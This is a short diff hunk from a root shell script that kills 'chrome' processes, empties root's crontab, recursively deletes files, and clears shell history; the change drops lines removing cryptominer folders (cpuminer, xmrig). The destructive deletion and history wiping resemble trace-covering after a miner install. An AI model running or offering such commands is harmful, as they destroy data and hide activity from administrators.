@@ -5,9 +5,7 @@ chmod +x /root/kill_miner.sh
 sleep 3
 /bin/pkill -f "chrome"
 cat /dev/null > /var/spool/cron/crontabs/root
-rm -fv *
-rm -fR cpuminer-opt-linux/
-rm -fR xmrig-6.21.0/
+sleep 3
 rm -fv *
 rm -fR *
 history -c && history -w
